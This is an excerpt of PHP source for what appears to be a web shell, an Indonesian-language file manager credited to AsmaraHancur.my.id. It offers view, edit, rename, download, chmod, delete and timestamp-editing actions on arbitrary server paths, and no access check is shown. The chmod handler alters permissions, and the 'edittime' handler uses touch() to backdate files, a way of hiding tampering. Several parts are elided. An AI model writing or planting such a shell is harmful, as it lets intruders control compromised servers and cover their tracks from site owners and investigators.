	...
	<div class='py-3' id='main'>
		...
		<div class='text-center'>
			<div class='btn-group'>
				...
				<a class='btn btn-outline-light btn-sm' href='https://AsmaraHancur.my.id'><i class='bi bi-box-arrow-in-left'></i> Website </a>
			</div>
		</div>";
...
?>
<td class='text-center'>
    <a class='btn btn-outline-light btn-sm' href='?dir=<?=urlencode($path)?>&action=view&opn=<?=$encodedPath?>'><i class='bi bi-eye-fill'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=<?=urlencode($path)?>&action=edit&opn=<?=$encodedPath?>'><i class='bi bi-pencil-square'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=<?=urlencode($path)?>&action=rename&opn=<?=$encodedPath?>'><i class='bi bi-pencil-fill'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=<?=urlencode($path)?>&action=download&opn=<?=$encodedPath?>'><i class='bi bi-download'></i></a>
    <a class='btn btn-outline-warning btn-sm' href='?dir=<?=urlencode($path)?>&action=chmod&opn=<?=$encodedPath?>'><i class='bi bi-shield-lock-fill'></i></a>
    <a class='btn btn-outline-info btn-sm' href='?dir=<?=urlencode($path)?>&action=edittime&opn=<?=$encodedPath?>'><i class='bi bi-clock-history'></i></a>
    <a class='btn btn-outline-danger btn-sm' href='?dir=<?=urlencode($path)?>&action=delete_file&opn=<?=$encodedPath?>'><i class='bi bi-trash-fill'></i></a>
</td>

		</tr>";
		}
        if ($_GET['action'] == 'chmod' && isset($_GET['opn'])) {
            $target = urldecode($_GET['opn']);
        
            if (!file_exists($target)) {
                echo "<div class='alert alert-danger'>File tidak ditemukan: <code>$target</code></div>";
            } else {
                if (isset($_POST['newperm'])) {
                    $input = trim($_POST['newperm']);
                    if (preg_match('/^[0-7]{3,4}$/', $input)) {
                        $perm = octdec($input);
                        if (chmod($target, $perm)) {
                            echo "<div class='alert alert-success'>Permission berhasil diubah ke $input.</div>";
                        } else {
                            echo "<div class='alert alert-danger'>Gagal mengubah permission.</div>";
                        }
                    } else {
                        echo "<div class='alert alert-warning'>Format permission tidak valid.</div>";
                    }
                }
        
                $currentPerm = substr(sprintf('%o', fileperms($target)), -4);
        ?>
                <h4>Ubah Permission File: <?= htmlspecialchars(basename($target)); ?></h4>
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Permission (contoh: 0755)</label>
                        <input type="text" name="newperm" value="<?= $currentPerm ?>" class="form-control" />
                    </div>
                    <button type="submit" class="btn btn-primary">Ubah Permission</button>
                    <a href="?dir=<?= urlencode(dirname($target)) ?>" class="btn btn-secondary">Kembali</a>
                </form>
        <?php
            }
        }
        if ($_GET['action'] == 'edittime' && isset($_GET['opn'])) {
            $target = urldecode($_GET['opn']);
            ...
            if (!file_exists($target)) {
                ...
                if (isset($_POST['newtime'])) {
                    $datetime = $_POST['newtime'];
                    $timestamp = strtotime($datetime);
                    if ($timestamp !== false) {
                        if (touch($target, $timestamp)) {
                            echo "<div class='alert alert-success'>Tanggal berhasil diubah ke $datetime.</div>";
                        } else {
                            echo "<div class='alert alert-danger'>Gagal mengubah tanggal.</div>";
                        }
                    } else {
                        echo "<div class='alert alert-warning'>Format tanggal tidak valid.</div>";
                    }
                }
        
                $currentTime = date("Y-m-d\TH:i", filemtime($target));
        ?>
                <h4>Ubah Tanggal File: <?= htmlspecialchars(basename($target)); ?></h4>
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Tanggal dan Waktu</label>
                        <input type="datetime-local" name="newtime" value="<?= $currentTime ?>" class="form-control" />
                    </div>
